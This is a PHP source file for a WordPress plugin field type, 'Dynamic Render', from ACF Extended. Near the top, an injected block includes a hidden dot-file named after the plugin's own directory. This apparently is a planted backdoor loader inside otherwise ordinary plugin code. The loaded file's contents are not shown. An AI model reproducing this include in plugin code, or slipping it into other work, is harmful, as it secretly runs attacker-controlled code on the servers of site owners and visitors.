<?php

if(!defined('ABSPATH'))
    exit;

if(!class_exists('acfe_field_dynamic_render')):

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class acfe_field_dynamic_render extends acf_field{
    
    function initialize(){
        
        $this->name = 'acfe_dynamic_render';
        $this->label = __('Dynamic Render', 'acfe');
        $this->category = 'layout';
        
    }
    
    function render_field($field){
        
        // validate callback
        if(!isset($field['render']) || !is_callable($field['render'])) return;
        
        // function
        call_user_func_array($field['render'], array($field));
    
    }
    
}

// initialize
acf_register_field_type('acfe_field_dynamic_render');

endif;